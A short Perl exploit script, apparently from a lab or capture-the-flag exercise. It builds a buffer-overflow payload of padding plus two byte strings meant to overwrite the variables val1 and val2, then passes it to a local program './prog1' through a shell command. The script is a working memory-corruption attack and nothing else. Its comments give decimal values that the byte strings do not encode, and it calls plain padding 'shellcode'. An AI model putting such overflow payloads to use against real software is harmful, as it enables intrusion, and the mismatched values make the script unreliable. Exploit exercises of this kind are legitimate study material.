#!/usr/bin/perl

use strict;
use warnings;

my $shellcode = "\x41" x (0x4030 - 0x4028);  # Relleno para llegar a la dirección de val1
my $val1 = "\xd7\x06\x5d\x06";  # Nuevo valor para val1: 1818390343
my $val2 = "\x59\x71\x6f\x72";  # Nuevo valor para val2: 1917480553

# Construir el comando para ejecutar el programa y pasar el payload
my $command = "./prog1 \"" . $shellcode . $val1 . $val2 . "\"";
system($command);